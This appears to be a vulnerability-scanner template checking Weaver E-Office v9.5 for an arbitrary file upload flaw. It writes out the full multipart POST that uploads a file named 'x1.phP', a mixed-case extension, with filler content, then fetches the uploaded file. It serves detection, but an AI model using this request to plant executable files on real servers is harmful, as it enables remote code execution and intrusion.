app: Weaver
query: app:"Weaver"
meta:
  name: ' Weaver E-Office v9.5 - Arbitrary File Upload'
  level: 4
  tags:
  - file_upload
  description: '    Weaver E-Office version 9.5 is susceptible to an arbitrary file
    upload vulnerability. This flaw allows malicious actors to upload and execute
    arbitrary code or files without proper validation or authorization.'
  homepage: ""
  author: X prism
  references: https://github.com/RCEraser/cve/blob/main/Weaver.md
  solution: upload to new version
  create_at: "2024-07-13 12:13:12"
  available: false
  steps:
    variable: []
    verify_steps:
      type: and
      verify:
      - request:
          method: POST
          path: /E-mobile/App/Ajax/ajax.php?action=mobile_upload_save
          redirect: true
          header:
          - Content-Type: multipart/form-data; boundary=----WebKitFormBoundarydRVCGWq4Cx3Sq6tt
          params: |-
            ------WebKitFormBoundarydRVCGWq4Cx3Sq6tt
            Content-Disposition: form-data; name="upload_quwan"; filename="x1.phP"
            Content-Type: image/jpeg

            sadasdsgfrgd
            ------WebKitFormBoundarydRVCGWq4Cx3Sq6tt
            Content-Disposition: form-data; name="file"; filename=""
            Content-Type: application/octet-stream


            ------WebKitFormBoundarydRVCGWq4Cx3Sq6tt--
        response:
        - name: code
          value: "200"
          type: equals
        - name: body
          value: webroot/attachment
          type: contains
        - name: body
          value: x1.phP
          type: contains
      - request:
          method: POST
          path: /attachment/12453/xxxxx1.phP
          redirect: true
          header: []
          params: ""
        response: []
    exploit_steps:
      type: ""
      params:
        name: ""
        type: input
        value: ""
